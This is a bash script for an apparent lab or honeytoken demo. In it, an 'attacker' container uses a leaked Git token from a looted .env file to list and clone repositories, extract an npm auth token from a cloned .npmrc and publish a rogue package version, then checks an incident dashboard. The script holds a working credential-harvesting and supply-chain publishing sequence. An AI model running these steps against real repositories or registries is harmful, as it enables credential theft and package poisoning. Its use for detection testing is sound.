#!/usr/bin/env bash
# Scenario 1: a leaked bait token (attacker container 172.30.0.66).
# The attacker found a copy of payments-api's .env and walks the supply chain:
# source (git) -> build (npm login) -> publish.
#   docker compose exec attacker bash /work/scenario1.sh
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

LOOT="$HERE/loot/payments-api.env"
[ -s "$LOOT" ] || die "$LOOT is missing. Run 'bash env/setup.sh' on the host first."
GIT_TOKEN="$(sed -n 's/^GITEA_TOKEN=//p' "$LOOT" | tr -d '\r')"
[ -n "$GIT_TOKEN" ] || die "No GITEA_TOKEN in $LOOT. Run 'bash env/setup.sh' on the host first."
make_workdir

step 1 5 "Listing repos with the leaked Git token (from payments-api/.env)"
curl -fsS -H "Authorization: token $GIT_TOKEN" "$GIT_URL/api/v1/user/repos" \
  | python3 -c 'import sys, json; [print("    " + r["full_name"]) for r in json.load(sys.stdin)]'
pause

step 2 5 "Cloning ops/ci-pipeline"
# extraHeader sends the token on the very first request (no 401 probe).
# protocol.version=0 makes git do one POST instead of two.
git -c credential.helper= -c protocol.version=0 -c "http.extraHeader=Authorization: token $GIT_TOKEN" \
  clone -q "$GIT_URL/ops/ci-pipeline.git" "$WORK/ci-pipeline"
ls -A "$WORK/ci-pipeline" | grep -v '^.git$' | sed 's/^/    /'
pause

step 3 5 "Looking for registry credentials in the cloned .npmrc"
NPM_TOKEN="$(sed -n 's#^//[^:]*:[0-9]*/:_authToken=##p' "$WORK/ci-pipeline/.npmrc" | tr -d '\r')"
[ -n "$NPM_TOKEN" ] || die "No _authToken found in the cloned .npmrc."
echo "    found an npm token in .npmrc (${#NPM_TOKEN} characters)"
write_npmrc "$NPM_TOKEN"
pause

step 4 5 "Checking who the npm token belongs to (npm whoami)"
run_npm whoami --registry "$NPM_URL" | sed 's/^/    /'
pause

step 5 5 "Publishing @kfu/build-utils@9.9.9 with that token"
make_package "$WORK/evil-package" "@kfu/build-utils" "9.9.9"
(cd "$WORK/evil-package" && run_npm publish --registry "$NPM_URL") | sed 's/^/    /'

echo
echo "Done. Check the dashboard: one incident, source -> build."
